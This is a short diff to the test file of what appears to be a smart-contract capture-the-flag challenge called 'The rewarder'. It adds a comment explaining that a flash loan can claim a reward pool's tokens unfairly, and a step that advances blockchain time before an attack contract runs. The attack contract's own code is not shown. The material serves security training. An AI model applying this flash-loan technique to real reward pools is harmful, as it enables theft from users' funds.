@@ -66,6 +66,15 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /**
+         * EXPLOIT:
+         * 
+         * The reward pool in vulnerable to a flash loan attack,
+         * as flash loan funds can be deposited which gives the attacker the reward tokens,
+         * and the loaned funds can be returned in the same tx.
+         * 
+         * The attacker must wait until the next snapshot round in order to perform the attack.
+         */
 
         const AttackFactory = await ethers.getContractFactory('AttackRewardPool', attacker);
         this.AttackContract = await AttackFactory.deploy(
@@ -74,6 +83,9 @@ describe('[Challenge] The rewarder', function () {
             this.liquidityToken.address,
             this.rewardToken.address
         );
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
 
         await this.AttackContract.attack()
     });
